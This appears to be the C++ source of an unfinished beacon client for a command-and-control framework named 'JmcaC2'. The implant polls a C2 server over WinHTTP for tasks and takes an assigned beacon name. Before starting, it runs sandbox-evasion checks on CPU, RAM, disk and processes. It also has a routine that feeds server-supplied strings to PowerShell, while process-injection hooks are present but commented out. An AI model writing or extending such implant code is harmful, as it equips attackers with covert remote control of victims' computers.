// Authors: Hudson and Isaac
// Date: 11/17/2025
// Description: Beacon client for JmcaC2
// Compile: g++ .\main.cpp -lwinhttp -lws2_32 -o beacon-client.exe

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "evasion.h"
#include "procInjection.h"

using std::string;

const wchar_t* ACCEPTED_MIME_TYPES[] = {
	L"text/plain", L"application/octet-stream", L"text/html", NULL };

void runPSCommand(string command);
int CreateTCPConn();
bool sendHTTPTaskResult();

static std::wstring beaconName = L"";

bool getHTTPTask(char** outBuffer, DWORD* dwSizeOut) {
	// TODO: This should be HTTPS but I'm using HTTP as a starting point
	// WinHTTP > WinINet

	/*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
	WinHttpAddRequestHeaders (user-agent/content-type) ->
	WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/

	// https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web

	// returns a WinHTTP-session handle.
	HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
	bool isRequestSuccessful{}, didReceiveResponse{};

	hHTTPSession =
		WinHttpOpen(L"JmcaC2 Task Fetching",
			WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS, 0);  // SYNCHRONOUS (blocking)

	/*does not result in an actual connection to the HTTP server until a
	request is made for a specific resource*/

	if (hHTTPSession)
		hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
			(INTERNET_PORT)HTTP_SERVER_PORT, 0);

	if (hHTTPConnection)
		hHTTPRequest = WinHttpOpenRequest(
			hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
			ACCEPTED_MIME_TYPES,
			WINHTTP_FLAG_REFRESH);  // WINHTTP_FLAG_SECURE for HTTPS

	// send the beacon name in a header if we have it
	std::wstring headerString;
	LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;

	if (!beaconName.empty()) {
		headerString = L"BeaconName: " + beaconName + L"\r\n";
		headerPtr = headerString.c_str();
	}

	if (hHTTPRequest)
		isRequestSuccessful =
		WinHttpSendRequest(hHTTPRequest, headerPtr, (DWORD)-1,
			WINHTTP_NO_REQUEST_DATA, 0, 0,
			0);  // WINHTTP_NO_REQUEST_DATA
	// should be replaced if POST

	didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL);

	// extract the beacon name from the response
	if (beaconName.empty() && didReceiveResponse) {
		DWORD size = 0;
		WinHttpQueryHeaders(
			hHTTPRequest,
			WINHTTP_QUERY_CUSTOM,
			L"BeaconName",
			WINHTTP_NO_OUTPUT_BUFFER,
			&size,
			WINHTTP_NO_HEADER_INDEX
		);

		// If size is 0, the header isn't present.
		if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
			std::wstring buffer(size / sizeof(wchar_t), L'\0'); // allocate correct size

			if (WinHttpQueryHeaders(
				hHTTPRequest,
				WINHTTP_QUERY_CUSTOM,
				L"BeaconName",
				&buffer[0],
				&size,
				WINHTTP_NO_HEADER_INDEX))
			{
				buffer.resize((size / sizeof(wchar_t))); // remove terminating null
				wprintf(L"Header value: %s\n", buffer.c_str());
				beaconName = buffer;
			}
		}
	}

	DWORD dwSize = 0;
	while (true) {
		if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize) break;
		char* responseBuf = new char[dwSize + 1];
		ZeroMemory(responseBuf, dwSize + 1);

		DWORD dwOut = 0;

		if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut)) {
			delete[] responseBuf;
			break;
		}
		// append chunk to output
		char* newBuf = new char[*dwSizeOut + dwOut];
		if (*outBuffer != nullptr)
		{
			memcpy(newBuf, *outBuffer, *dwSizeOut);
			delete[] (*outBuffer);
		}
		memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);

		*outBuffer = newBuf;
		*dwSizeOut = dwOut;

		delete[] responseBuf;
	}

	if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
	if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
	if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);

	return didReceiveResponse;
}

void runPSCommand(string command) {
	string powershellPrefix{ "powershell -c " };
	system((powershellPrefix + command).c_str());
	// TODO: Make this process injection?
}

int main(int argc, const char** argv) {

	// Run all checks
	BOOL cpuOK = checkCPU();
	BOOL ramOK = checkRAM();
	BOOL hddOK = checkHDD();
	BOOL processesOK = checkProcesses();

	// Check if all tests passed
	if (!cpuOK || !ramOK || !hddOK || !processesOK) {
		return 0;
	}


	char* outBuffer = nullptr;
	DWORD dwSize = 0;

	while (true) {

		if (getHTTPTask(&outBuffer, &dwSize)) {
			// TODO: parse tasks and do
			if (dwSize > 0) {
				printf("TASK: %.*s\n", dwSize, outBuffer);
				delete[] outBuffer;
				dwSize = 0;
			}
			//processInject();
			//runPSCommand(argv[1]);
			// TODO: post results
		}

		// TODO: jitter sleep interval
		Sleep(5000);

	}

	return 0;
}